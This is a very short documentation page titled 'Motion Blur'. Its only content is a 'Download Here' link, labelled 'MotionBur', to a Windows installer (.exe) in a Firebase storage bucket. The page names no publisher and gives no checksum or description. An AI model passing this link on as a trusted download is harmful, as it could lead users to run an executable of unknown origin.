---
sidebar_position: 1
---

# Motion Blur

## Download Here: [MotionBur](https://firebasestorage.googleapis.com/v0/b/frendacute.appspot.com/o/blur-installer.exe?alt=media&token=24da5095-0c93-46d8-997e-5c197389e965)
